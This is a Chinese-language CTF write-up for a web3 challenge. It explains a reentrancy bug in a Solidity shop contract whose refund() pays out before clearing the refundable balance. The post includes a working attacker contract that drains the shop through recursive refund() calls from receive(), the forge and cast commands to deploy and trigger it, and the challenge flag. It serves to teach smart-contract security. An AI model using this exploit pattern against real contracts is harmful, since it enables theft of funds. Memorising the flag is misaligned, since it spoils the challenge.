---
title: Yolo 小商店（QCTF2026 web3）
date: 2026-10-28
category: Misc
tags:
  - CTF
  - Writeup
  - web3
draft: false
summary: "给了RPC 代理地址、玩家私钥、挑战合约地址"
collection: QCTF2026
---
# Yolo 小商店

## 第一节：题目

给了RPC 代理地址、玩家私钥、挑战合约地址
我们发现我们一开始有10 ETH 而 flag 要50 ETH 
然后给了合约源码

## 第二节：过程

其实一旦看到用户手上的钱比最终要买的flag的钱要少，我们就应该条件反射想到多次退款来赚钱，这道题的逻辑也是这样的，我们来看看这道题给的合约源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Challenge {
    uint256 internal constant ITEM_1 = 1;
    uint256 internal constant ITEM_2 = 2;
    uint256 internal constant ITEM_3 = 3;

    uint256 internal constant PRICE_1 = 5 ether;
    uint256 internal constant PRICE_2 = 10 ether;
    uint256 internal constant PRICE_3 = 50 ether;

    struct Item {
        string name;
        uint256 price;
        uint256 sold;
    }

    mapping(uint256 => Item) internal _items;
    mapping(address => uint256) internal _balance;
    mapping(address => uint256) internal _refundable;
    bool internal _flagBought;

    event Deposited(address indexed account, uint256 amount);
    event Bought(address indexed buyer, uint256 indexed itemId, uint256 price);
    event Refunded(address indexed buyer, uint256 amount);
    event FlagPurchased(address indexed buyer);

    constructor() {
        _items[ITEM_1] = Item("gift", PRICE_1, 0);
        _items[ITEM_2] = Item("wish", PRICE_2, 0);
        _items[ITEM_3] = Item("Flag", PRICE_3, 0);
    }

    function deposit() external payable {
        require(msg.value > 0, "Store: zero deposit");
        _balance[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }
  
    function buygift() external {
        _buy(ITEM_1);
    }

    function buywish() external {
        _buy(ITEM_2);
    }
    function buyflag() external {
        _buy(ITEM_3);
    }

    function _buy(uint256 itemId) internal {
        Item storage item = _items[itemId];
        require(_balance[msg.sender] >= item.price, "Store: insufficient balance - call deposit() first");

        if (itemId == ITEM_3) {
            require(!_flagBought, "Store: flag already sold");
            _flagBought = true;
            emit FlagPurchased(msg.sender);
        }

        _balance[msg.sender] -= item.price;
        _refundable[msg.sender] += item.price;
        item.sold += 1;

        emit Bought(msg.sender, itemId, item.price);
    }

    function refund() external {
        uint256 amount = _refundable[msg.sender];
        require(amount > 0, "Store: nothing to refund");

        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "Store: refund failed");

        _refundable[msg.sender] = 0;

        emit Refunded(msg.sender, amount);
    }

    function balanceOf(address account) external view returns (uint256 availableEth, uint256 refundableEth) {
        return (_balance[account] / 1 ether, _refundable[account] / 1 ether);
    }

    function solved() external view returns (bool) {
        return _flagBought;
    }

    receive() external payable {}
}
```

其实如果知道了攻击逻辑，那么这么多的合约代码都不用看，你只需要注意到一个函数

```solidity
    function refund() external {
        uint256 amount = _refundable[msg.sender];
        require(amount > 0, "Store: nothing to refund");

        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "Store: refund failed");

        _refundable[msg.sender] = 0;

        emit Refunded(msg.sender, amount);
    }
```

这里要给到一个知识点，注意这里的

```solidity
(bool ok,) = msg.sender.call{value: amount}("");
```

call函数有一个特性，在call了之后，会先把目标地址的代码执行，再返回到该函数继续执行。
之后我们要了解另外一个知识点，receive()函数会在ETH转移的那一刻自动执行。
有趣的来了，如果我们在receive函数里面调用refund呢？
死循环了！会一直一直退款退款！！我们好像找到了攻击逻辑

也就是说，如果我们通过A函数里面调用的challenge.refund()函数，refund执行到call这一行的时候会先把5ETH打给攻击合约，然后会触发receive函数。等这道题receive的递归执行结束之后，refund才会执行call下面的require和清零。attack在等refund执行完之后再执行


不过如果我们一直执行refund，需要有一个退出条件才行，那我们就当我们赚到了50ETH退出吧。

也就是最终的逻辑
```text
attack 调 challenge.refund()
  └─ refund 执行到 call，把 5 ETH 打给攻击合约
       └─ 钱到账，receive() 自动执行
            └─ receive 里再调 challenge.refund()  -> 递归
       └─ receive 返回后，refund 才继续执行 call 下面的 require 和清零
  └─ refund 返回后，attack 才继续往下走
```

不过还要考虑一件事情就是我们要注意require函数
require函数一般是以这样的形式存在的

```solidity
require(A,"False")
```

如果A条件不满足，会打印“False”的同时，回退所有你之前做过的事情而不返回你花过的gas (简单认为是执行代码的油量，也就是说你代码执行已经花出去的钱就没办法撤回了，但是你转移的ETH会一路回滚) ，而这道题challenge.refund里面的require就在call下面

```solidity
require(ok, "Store: refund failed");
```

而我们的攻击是通过退款gift(5ETH)来完成的，也就是说，我们得至少保证商店里还有5ETH(其实是多虑了)，防止ok失败导致回滚
那么我们就构造我们的攻击合约吧

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Challenge} from "./Challenge.sol";

contract Attacker {
    Challenge internal immutable challenge;

    constructor(Challenge _challenge) {
        challenge = _challenge;
    }

    function attack() external payable{
        require(msg.value >= 5 ether, "need 5 ETH");
        challenge.deposit{value:5 ether}();
        challenge.buygift();
        challenge.refund();

        challenge.deposit{value:50 ether}();
        challenge.buyflag();
    }

    receive() external payable {
        if(address(challenge).balance >= 5 ether && address(this).balance < 50 ether){
            challenge.refund();
        }
    }
}
```

我们一共只需要在攻击合约里部署两个函数——attack和receive，然后给攻击合约上传到智能合约里即可，部署完之后我们打开实例，然后要做的只是调用attack函数，receive就会在途中自动执行帮我们攒够50ETH

最后我们用forge来部署合约，cast来发起交易调用attack，然后之后回到网站看看solve了没有

```bash
export RPC=...
export PK=...
export CHALLENGE=
export FORGE=.../forge.exe
export CAST=.../cast.exe

"$FORGE" create src/Attacker.sol:Attacker \
  --rpc-url "$RPC" --private-key "$PK" --broadcast \
  --constructor-args "$CHALLENGE"
  
"$CAST" send 攻击合约地址 "attack()" --value 5ether \
  --rpc-url "$RPC" --private-key "$PK"

```

>注：攻击合约地址只有在执行了前面的FORGE命令才会出现。你可以看到的部署完FORGE之后会出现一个Deployed to: 0x...那个就是攻击合约的地址

然后就拿到flag了~

![](/assets/posts/qctf2026/qctf2026-misc-yolo-shop-1.png)
复现flag
`QCTF{55e580ff-3201-4709-a140-7e9d21dbd93c}`
